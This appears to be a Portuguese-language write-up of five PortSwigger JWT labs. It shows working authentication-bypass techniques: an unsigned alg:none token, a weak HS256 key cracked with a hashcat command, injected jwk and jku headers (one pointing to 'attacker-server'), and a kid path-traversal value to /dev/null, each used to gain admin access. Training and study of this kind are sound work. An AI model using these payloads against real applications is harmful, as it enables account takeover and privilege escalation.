# JWT Attacks – Authentication Bypass Labs

## 📌 Informações Gerais

* Plataforma: PortSwigger Web Security Academy
* Categoria: JWT Attacks
* Nível: Apprentice → Practitioner
* Ferramentas utilizadas:

  * Burp Suite Community
  * Firefox
  * Hashcat
  * JWT Editor
  * Linux CLI
  * OpenSSL
  * Python (PyJWT)

---

# 1. JWT Authentication Bypass via Unverified Signature

## Vulnerabilidade

A aplicação aceitava tokens com algoritmo:

```json
{
  "alg": "none"
}
```

Sem exigir assinatura válida.

---

## Exploração

JWT original:

```json
{
  "sub": "wiener"
}
```

Payload modificado:

```json
{
  "sub": "administrator"
}
```

Header alterado:

```json
{
  "alg": "none"
}
```

A assinatura foi removida completamente.

---

## Resultado

A aplicação aceitou o token não assinado e concedeu acesso administrativo.

Endpoint explorado:

```http
/admin
```

Posteriormente:

```http
/admin/delete?username=carlos
```

---

## Conceitos Aprendidos

* JWT sem assinatura
* Algoritmo none
* Bypass de autenticação
* Escalação de privilégios

---

# 2. JWT Authentication Bypass via Weak Signing Key

## Vulnerabilidade

O servidor utilizava uma chave secreta extremamente fraca para assinar tokens HS256.

---

## Reconhecimento

JWT identificado:

```json
{
  "alg": "HS256"
}
```

Foi realizado brute-force utilizando Hashcat.

---

## Ataque

Comando utilizado:

```bash
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
```

Resultado:

```text
secret1
```

---

## Exploração

Payload original:

```json
{
  "sub": "wiener"
}
```

Payload modificado:

```json
{
  "sub": "administrator"
}
```

Token assinado novamente utilizando:

```text
secret1
```

---

## Resultado

Acesso administrativo obtido.

Endpoint utilizado:

```http
/admin/delete?username=carlos
```

---

## Conceitos Aprendidos

* JWT HS256
* Brute Force de Signing Keys
* Hashcat
* Reassinar Tokens JWT

---

# 3. JWT Authentication Bypass via JWK Header Injection

## Vulnerabilidade

A aplicação aceitava a chave pública enviada pelo próprio usuário através do parâmetro:

```json
{
  "jwk": {...}
}
```

Sem validar a origem da chave.

---

## Exploração

Foi gerado um novo par RSA:

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

---

## Conversão para JWK

A chave pública foi convertida para formato JWK:

```json
{
  "kty":"RSA",
  "e":"AQAB",
  "n":"..."
}
```

---

## Payload Modificado

```json
{
  "sub":"administrator"
}
```

---

## Assinatura

O token foi assinado com a chave privada gerada pelo atacante.

O header passou a conter:

```json
{
  "alg":"RS256",
  "jwk":{...}
}
```

---

## Resultado

O servidor utilizou a chave pública fornecida pelo atacante para validar o JWT.

Acesso administrativo obtido.

---

## Conceitos Aprendidos

* JWK
* RSA
* RS256
* Assinatura Assimétrica
* Confiança em Chaves Não Confiáveis

---

# 4. JWT Authentication Bypass via JKU Header Injection

## Vulnerabilidade

O servidor aceitava o parâmetro:

```json
{
  "jku":"https://attacker-server/jwks.json"
}
```

Sem validar a origem da URL.

---

## Exploração

Foi criado um JWKS controlado pelo atacante:

```json
{
  "keys":[
    {
      "kty":"RSA",
      "e":"AQAB",
      "n":"..."
    }
  ]
}
```

Hospedado no Exploit Server.

---

## Payload

```json
{
  "sub":"administrator"
}
```

---

## Resultado

O servidor baixou a chave pública do servidor controlado pelo atacante e validou o JWT adulterado.

Acesso administrativo obtido.

---

## Conceitos Aprendidos

* JWKS
* JKU Header
* Key Distribution
* Trusted Key Sources
* Server Side Trust Abuse

---

# 5. JWT Authentication Bypass via KID Header Path Traversal

## Vulnerabilidade

A aplicação utilizava o valor de:

```json
{
  "kid":"..."
}
```

Para localizar arquivos de chave no sistema.

Não havia sanitização adequada.

---

## Exploração

Header modificado:

```json
{
  "alg":"HS256",
  "kid":"../../../../../../../dev/null"
}
```

---

## Assinatura

O token foi assinado utilizando chave vazia:

```text
""
```

ou

```json
{
  "k":""
}
```

Dependendo da implementação.

---

## Resultado

O servidor carregou:

```text
/dev/null
```

Como chave de verificação.

Isso permitiu criar uma assinatura válida e assumir privilégios administrativos.

---

## Conceitos Aprendidos

* Path Traversal
* File-Based Key Resolution
* KID Header Abuse
* JWT Verification Bypass

---

# Impacto Geral das Vulnerabilidades JWT

Uma implementação insegura de JWT pode resultar em:

* Bypass completo da autenticação
* Escalação de privilégios
* Comprometimento de contas administrativas
* Acesso a dados sensíveis
* Execução de ações privilegiadas
* Comprometimento total da aplicação

---

# Conceitos Dominados

Após concluir estes laboratórios foram praticados:

* JWT Structure
* Header
* Payload
* Signature
* HS256
* RS256
* JWK
* JWKS
* JKU Header
* KID Header
* Algorithm Confusion
* Weak Signing Keys
* Brute Force com Hashcat
* RSA Keys
* OpenSSL
* PyJWT
* Authentication Bypass
* Privilege Escalation
* Burp Suite JWT Analysis
